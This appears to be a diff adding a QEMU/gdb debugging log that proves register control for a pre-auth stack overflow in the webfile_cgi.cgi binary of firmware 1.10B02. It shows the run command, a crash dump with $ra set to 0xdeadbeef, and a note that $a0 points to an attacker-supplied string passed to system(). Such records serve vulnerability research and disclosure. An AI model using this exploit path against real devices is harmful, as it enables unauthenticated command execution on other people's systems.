@@ -1,0 +1,9 @@
+# QEMU user-mode + gdb: 1.10B02 webfile_cgi.cgi pre-auth stack overflow — $ra/$s0-$s4 control proof
+# payload: poc_1.10B02_control_deadbeef.bin (1102 bytes), $ra=0xdeadbeef
+# run: qemu-mips -g <port> -L <rootfs> usr/bin/webfile_cgi.cgi  (POST body on stdin)
+Program received signal SIGSEGV, Segmentation fault.
+PC=0xdeadbeef RA=0xdeadbeef S0=0x11111111 S1=0x22222222 S2=0x33333333 S3=0x44444444 S4=0x55555555 A0=0x407f3de1 SP=0x40800d10
+
+# Result: the saved return address ($ra) and all five saved registers ($s0-$s4) are fully
+# controlled; $a0 = 0x407f3de1 = &field0_value + 1 (the command-string pointer used for
+# system()).
